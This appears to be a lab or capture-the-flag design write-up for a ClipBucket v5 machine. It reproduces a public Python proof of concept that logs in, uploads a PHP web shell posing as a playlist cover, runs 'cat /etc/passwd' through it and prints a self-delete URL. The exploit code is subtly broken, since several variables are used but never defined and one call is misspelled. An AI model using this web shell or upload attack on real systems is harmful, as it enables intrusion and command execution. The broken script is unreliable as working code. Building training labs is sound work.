After the web-GUI configuration is done, the student can start solving the machine, there needs to be a way for him to retrieve the admin credentials, which we can provide as default credentials for the software, chain another vulnerability to exploit, or leak the credentials on another service.

Once the admin credentials are found, and vulnerability analysis is performed the student should be able to determine the vulnerability the system has, and the exploit that he should perform against our application, and should be able to find a public PoC to do so.

The PoC to be used is provided as a reference in the official security advisory (https://github.com/MacWarrior/clipbucket-v5/security/advisories/GHSA-98vm-2xqm-xrcc) issued by MacWarrior, the lead developer of ClipBuckets-v5.

## PoC

```python
#!/usr/bin/python

# by Ka Wing Ho - wingz
# assumes Linux system not Windows
# python poc.py <username> <password> <http(s)://target>

from datetime import datetime
import requests
import sys

# get args
USAGE = "Usage: python {} <username> <password> <http(s)://target>".format(sys.argv[0])
if len(sys.argv) < 4:
    print(USAGE)
    sys.exit()

user = sys.argv[1]
passw = sys.argv[2]
target = sys.argv[3]

if 'http' not in target:
    print(USAGE)
    print("[>] Please specify http:// or https:// protocol")
    sys.exit()

# remove trailing slash if present
if target[-1] == "/": target = target[:-1]

# testing connection to target
r = requests.get(target)
if "ClipBucketV5" not in r.text:
    print("[>] Target frontpage not accessible or is not ClipBucketV5")
    sys.exit()

# obtain user session
s = requests.Session()
login_data = {
        "login"   : "login",
        "username": user,
        "password": passw
}

r = s.post("{}/signup.php?mode=login".format(target),login_data)
if 'Username and Password Didn&#039;t Match' in r.text:
    print("[>] Authentication failed, bad username and/or password")
    sys.exit(1)

# check if admin or not, adjust web request

webshell_code = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''

payload = {
    "upload_playlist_cover": (None,"1"),
    "playlist_cover" : ("shell.php", webshell_code)
} # we don't need any of the other parameters, just the essentials

r = s.post("{}{}?mode=edit_playlist&pid=1337".format(target,upload_url), files=payload)
if isAdmin and r.status_code == 200 and "Playlist does not exist" in r.text:
    print("[+] Webshell upload as admin succeeded")
elif not isAdmin and r.status_code == 200 and "Playlist cover has been uploaded" in r.text:
    print("[+] Webshell upload as low-level user succeeded")
else:
    print("[-] Webshell upload failed!!!")
    sys.exit(1)

# verify webshell (with unauth-ed session)
webshell_url = "{}/images/playlist_covers/{}/1337.php".format(target,dt)
r = requests.get(webshell_url)
if r.status_code == 404:
    # you may have to try +- 1 day to account for different server clocktimes
    print("[>] Webshell browsing failed! Maybe incorrect date in URL path: {}".format(dt))
    print("[>] Try increasing/decreasing the date: {}".format(webshell_url))
    sys.ext(1)
elif r.status_code == 200:
    pass
else:
    print("[>] Unknown error: {}".format(r.status_code))
    sys.exit(2)

# execute webshell sample (with unauth-ed session)
cmd = "cat+/etc/passwd"
rce_url = "{}/images/playlist_covers/{}/1337.php?cmd={}".format(target,dt,cmd)
print("[+] Sample webshell usage: \033[94m{}\x1b[0m (you can copy+paste this in browser)".format(rce_url))
r = requests.get(rce_url)

print(r.text.replace("<pre>","\n").replace("</pre>",""))

cmd = "rm+1337.php"
delete_url = "{}/images/playlist_covers/{}/1337.php?cmd={}".format(target,dt,cmd)
print("[+] Cleanup: use the webshell to delete itself => \033[93m{}\x1b[0m (you can copy+paste this in browser)".format(delete_url))
```

After running the PoC with the admin credentials, we will get a web-shell as demonstrated by my exploitation of the deployed machine below:

```bash
python3 poc.py admin admin http://127.0.0.1
```
